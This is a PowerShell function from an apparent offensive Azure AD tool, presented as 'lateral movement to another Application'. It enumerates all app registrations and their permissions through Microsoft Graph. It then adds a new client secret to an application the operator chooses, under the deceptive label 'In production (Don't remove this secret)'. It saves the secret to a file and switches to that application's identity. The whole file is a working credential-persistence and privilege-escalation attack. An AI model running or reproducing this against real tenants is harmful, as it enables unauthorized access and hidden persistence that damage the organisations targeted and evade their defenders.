function Add-AzApplicationManipulation {

    Clear-Host
    Write-host "+======================================================================================+" -ForegroundColor Blue
    Write-Host @("
    @@@@@@@@@@@@#G55PG#@@@@@@@@@@@@@@@@
    @@@@@@@@@#J!~^^^^^~!J#@@@@@@@@@@@@@
    @@@@@@@@Y~~~~!!!!!~~~~5@@@@@@@@@@@@
    @@@@@@@B~!!!!!!!!!!!!!~#@@@@@@@@@@@
    @@@@@@@G!7777777777777!B@@@@@@@@@@@
    @@@@@@@@J7???????????7Y@@@@@@@@@@@@
    @@@@@@@@@GJJJJJJJJJJYB@@@@@@@@@@@@@
    @@@@@@@@#P?^^!777!^~JB&@@@@@@@@@@@@") -ForegroundColor Cyan -NoNewline
    Write-Host "    [*] Lateral movement to another Application [*]" -ForegroundColor Yellow -NoNewline
    Write-Host @(" 
    @@@@@#J~^^~^       ^~^~75J^~JB@@@@@
    @@@&J~~~~~~!~     ~~^:........:~5&@
    @@&7~!!!!!!!!^   ~!!:::.......::^7@
    @@?!7777777777: ^77!^^^^::.:~!777?@
    @G7777777777777!7777^^:::..^^~!!!?@
    @J7????????????????7^......^::::~Y@
    @#5YYYYYYYYYYYYYYYYYYJ7~^..:^!Y#@@@
    @@@@@@@@@@@@@@@@@@@@@@@@@&5G&@@@@@@
 ") -ForegroundColor Cyan
    Write-host "+======================================================================================+" -ForegroundColor Blue


    $azApplicationEndpoint = "/applications/"

    try {
        $azAdAppListId = (Invoke-RestMethod -Uri ($msGraphEndpoint + $azApplicationEndpoint) -Method Get -Headers $httpAuthHeader).value
    }
    catch {
        Write-Warning $Error[0]
    }
    foreach ($appObjId in $azAdAppListId.id) {
        try {
            $azAdAppList = (Invoke-RestMethod -Uri ($msGraphEndpoint + $azApplicationEndpoint + $appObjId) -Method Get -Headers $httpAuthHeader)
        }
        catch {
            Write-Warning $Error[0]
        }
        Write-Host "[+] Application Name: " -NoNewline
        Write-Host ($azAdAppList.displayName) -ForegroundColor Green
        Write-Host "[+] Application object Id: " -NoNewline
        Write-Host ($azAdAppList.id) -ForegroundColor Green
        Write-Host "[+] Application ID:"  -NoNewline
        Write-Host ($azAdAppList.appId) -ForegroundColor Green
        Write-Host "[+] Application Roles:"
        for ($i = 0; $i -lt ((($azAdAppList.requiredResourceAccess).ResourceAccess).id.length); $i++) {
            #Write-Host "    [*]" ((($azAdAppList.requiredResourceAccess).ResourceAccess).id)[$i] -ForegroundColor Magenta
            $rlist = Get-Content .\Roles.json
            $blist = $rlist -match ((($azAdAppList.requiredResourceAccess).ResourceAccess).id)[$i]
            $blist[0] 
        } 
        Write-host "+======================================================================================+" -ForegroundColor Blue
    }

    $lateralMovementOption = Read-Host "[+] Please enter `"Yes`" if you would like to navigate to a different application, or press any other key to return to the main menu"
    if ($lateralMovementOption -eq 'Yes') {

        $appObjectId = Read-Host "[+] Please insert the Application Object ID"

        try {
            $azAdAppListId = (Invoke-RestMethod -Uri ($msGraphEndpoint + $azApplicationEndpoint + $appObjectId) -Method Get -Headers $httpAuthHeader)
        }
        catch {
            Write-Warning $Error[0]
        }

        $secretEndpoint = "/applications/$appObjectId/addPassword"

        $body = @("
            {
                'passwordCredential': {
                  'displayName': 'In production (Don't remove this secret)'
                }
            }
        ")

        try {
            $addAppSecret = (Invoke-RestMethod -Uri ($msGraphEndpoint + $secretEndpoint) -Method Post -Body $body -Headers $httpAuthHeader -ContentType 'application/json')
        }
        catch {
            Write-Warning $Error[0]
        }

        if (($null -eq $addAppSecret).secretText) {
            Write-Host "[+] Invalid value."
            Exit
        }
        else {
            Write-Host "[+] Secret added to the application and saved in Secrets.txt file." -ForegroundColor Green
            $addAppSecret | Out-File -FilePath .\Secrets.txt
        }
        
        Disconnect-AzAccount | Out-Null

        $appSecret = $addAppSecret.secretText
        $azureApplicationID = $azAdAppListId.appId

        for ($i = 1; $i -le 100; $i++ ) {
            Write-Progress -Activity " [+] Please wait for 20 seconds as you switch to another application." -Status " $i% Complete:" -PercentComplete $i
            Start-Sleep -Milliseconds 200
        }

        Init
    }
    else {
        Menu
    }
}
Add-AzApplicationManipulation 